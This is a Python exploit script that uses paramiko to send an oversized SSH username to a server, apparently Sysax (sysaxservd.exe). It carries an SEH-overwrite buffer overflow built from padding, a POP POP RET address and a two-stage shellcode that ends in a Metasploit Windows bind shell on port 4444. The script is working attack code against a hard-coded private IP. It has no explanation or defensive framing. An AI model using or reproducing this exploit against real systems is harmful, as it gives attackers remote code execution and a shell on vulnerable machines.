#!/usr/bin/python

import paramiko
import os
import sys

host = '10.37.129.3'
port = 22

junk = "A" * 8692
junk += "\x90" * 127
nseh = "\xeb\x08\x90\x90"
seh = "\x4b\xa6\x52\x00" 		#0x0052a64b POP POP RET from sysaxservd.exe
sisa = "\x90" * (10000 - 9212)

#1st stage shellcode, jump 512 bytes backward
# 17 bytes
stage1 = "\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xC1\x0A\x90\xFE\xCD\xFE\xCD\xFF\xE1"

# 2nd stage shellcode, bindshell
# msfpayload windows/shell_bind_tcp LPORT=4444
# size 368
stage2 = ("\xda\xd8\xb8\x45\x14\x7c\xc3\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x56\x83\xeb\xfc\x31\x43\x14\x03\x43\x51\xf6\x89\x3f\xb1\x7f"
"\x71\xc0\x41\xe0\xfb\x25\x70\x32\x9f\x2e\x20\x82\xeb\x63\xc8"
"\x69\xb9\x97\x5b\x1f\x16\x97\xec\xaa\x40\x96\xed\x1a\x4d\x74"
"\x2d\x3c\x31\x87\x61\x9e\x08\x48\x74\xdf\x4d\xb5\x76\x8d\x06"
"\xb1\x24\x22\x22\x87\xf4\x43\xe4\x83\x44\x3c\x81\x54\x30\xf6"
"\x88\x84\xe8\x8d\xc3\x3c\x83\xca\xf3\x3d\x40\x09\xcf\x74\xed"
"\xfa\xbb\x86\x27\x33\x43\xb9\x07\x98\x7a\x75\x8a\xe0\xbb\xb2"
"\x74\x97\xb7\xc0\x09\xa0\x03\xba\xd5\x25\x96\x1c\x9e\x9e\x72"
"\x9c\x73\x78\xf0\x92\x38\x0e\x5e\xb7\xbf\xc3\xd4\xc3\x34\xe2"
"\x3a\x42\x0e\xc1\x9e\x0e\xd5\x68\x86\xea\xb8\x95\xd8\x53\x65"
"\x30\x92\x76\x72\x42\xf9\x1e\xb7\x79\x02\xdf\xdf\x0a\x71\xed"
"\x40\xa1\x1d\x5d\x09\x6f\xd9\xa2\x20\xd7\x75\x5d\xca\x28\x5f"
"\x9a\x9e\x78\xf7\x0b\x9e\x12\x07\xb3\x4b\xb4\x57\x1b\x23\x75"
"\x08\xdb\x93\x1d\x42\xd4\xcc\x3e\x6d\x3e\x7b\x79\xa3\x1a\x28"
"\xee\xc6\x9c\xdf\xb2\x4f\x7a\xb5\x5a\x06\xd4\x21\x99\x7d\xed"
"\xd6\xe2\x57\x41\x4f\x75\xef\x8f\x57\x7a\xf0\x85\xf4\xd7\x58"
"\x4e\x8e\x3b\x5d\x6f\x91\x11\xf5\xe6\xaa\xf2\x8f\x96\x79\x62"
"\x8f\xb2\xe9\x07\x02\x59\xe9\x4e\x3f\xf6\xbe\x07\xf1\x0f\x2a"
"\xba\xa8\xb9\x48\x47\x2c\x81\xc8\x9c\x8d\x0c\xd1\x51\xa9\x2a"
"\xc1\xaf\x32\x77\xb5\x7f\x65\x21\x63\xc6\xdf\x83\xdd\x90\x8c"
"\x4d\x89\x65\xff\x4d\xcf\x69\x2a\x38\x2f\xdb\x83\x7d\x50\xd4"
"\x43\x8a\x29\x08\xf4\x75\xe0\x88\x04\x3c\xa8\xb9\x8c\x99\x39"
"\xf8\xd0\x19\x94\x3f\xed\x99\x1c\xc0\x0a\x81\x55\xc5\x57\x05"
"\x86\xb7\xc8\xe0\xa8\x64\xe8\x20")


payload = junk+stage2+nseh+seh+stage1+sisa
try:
	transport = paramiko.Transport((host, port))
except:
	print "[X] Unable to connect to " + host + " on port " + str(port)
	sys.exit(1)
transport = paramiko.Transport((host, port))
print "[+] Launching exploit against " + host + " on port " + str(port)
print "[+] Length:", len(payload)
print "[+] Done!"
transport.connect(username = payload, password = "test")
transport.close()
